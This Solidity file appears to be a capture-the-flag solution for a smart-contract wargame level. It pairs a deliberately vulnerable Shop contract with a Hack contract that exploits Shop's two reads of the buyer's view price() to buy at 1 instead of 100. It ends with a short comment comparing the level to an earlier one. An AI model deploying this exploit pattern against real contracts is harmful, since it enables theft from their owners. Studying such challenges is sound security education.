// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Hack {
  Shop shop;
  function hack(Shop _addr) public {
    shop = _addr;
    shop.buy();
  }
  
  function price() public view returns (uint){
    if(!shop.isSold()) return 101;
    return 1;
  }
}

//Almost similar to level 11. 
//Just the change is that in price function of Hack contract, we can't store any variables, since 
//price() function should be view.